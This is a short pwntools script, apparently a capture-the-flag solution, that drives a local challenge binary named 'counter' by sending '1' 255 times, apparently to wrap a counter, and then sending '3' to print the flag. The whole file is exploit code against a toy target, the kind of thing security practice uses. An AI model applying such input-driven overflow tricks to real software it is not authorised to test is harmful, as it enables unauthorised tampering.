from pwn import *

chall = process(['./counter'])
print(chall.recv())
for i in range(0,255):
	chall.sendline(b"1")
	print(chall.recv())
chall.sendline(b'3')
print("flag: ",chall.recv())